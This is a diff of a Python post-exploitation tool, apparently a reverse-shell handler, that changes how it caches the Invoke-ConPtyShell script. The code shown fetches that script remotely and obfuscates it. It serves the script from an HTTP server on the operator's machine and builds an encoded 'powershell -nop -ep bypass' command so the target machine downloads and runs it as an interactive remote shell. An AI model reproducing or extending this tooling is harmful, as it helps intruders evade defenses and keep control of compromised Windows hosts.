@@ -8,7 +8,7 @@ import urllib.request
 from typing import Callable, Dict, Optional
 
 from koi.session import Session
-from koi.utils.cache import load_conptyshell, save_conptyshell, cache_exists, conpty_cache_path
+from koi.utils.cache import put_cache, get_cache, cache_path
 from koi.utils.ps_obfuscate import obfuscate_conptyshell, _obfuscate_call
 from koi.utils.tcp import spawn_http_server
 from koi.utils.ui import Spinner, notify, _b, _p
@@ -33,14 +33,17 @@ def _build_invoke_cmd(
     return f"powershell -nop -ep bypass -enc {encoded}"
 
 
+_CONPTY_CACHE_NAME = "Invoke-ConPtyShell.ps1"
+
+
 def _fetch_conptyshell() -> tuple[bytes, str]:
     try:
         with urllib.request.urlopen(_CONPTYSHELL_URL, timeout=15) as resp:
             ps1_data = resp.read()
-        save_conptyshell(ps1_data)
+        put_cache(_CONPTY_CACHE_NAME, ps1_data)
         return ps1_data, "remote"
     except Exception as exc:
-        cached = load_conptyshell()
+        cached = get_cache(_CONPTY_CACHE_NAME)
         if cached is not None:
             return cached, "cache"
         raise exc
@@ -73,12 +76,12 @@ def upgrade_windows_conptyshell(
             return
 
     if source == "cache":
-        notify('warning', f"Network unavailable, using cached ConPtyShell ({conpty_cache_path()})")
+        notify('warning', f"Network unavailable, using cached ConPtyShell ({cache_path(_CONPTY_CACHE_NAME)})")
     else:
-        notify('info', "ConPtyShell fetched from remote (cache updated)")
+        notify('info', "ConPtyShell fetched from remote")
 
     ps1_data, conpty_fn = obfuscate_conptyshell(ps1_data)
-    http_port, http_thread = spawn_http_server(ps1_data, timeout=60.0)
+    http_port, _ = spawn_http_server(ps1_data, timeout=60.0)
     notify('info', f"Serving ConPtyShell on port {_b(http_port)}")
 
     invoke_cmd = _build_invoke_cmd(local_ip, http_port, port, rows, cols, conpty_fn)
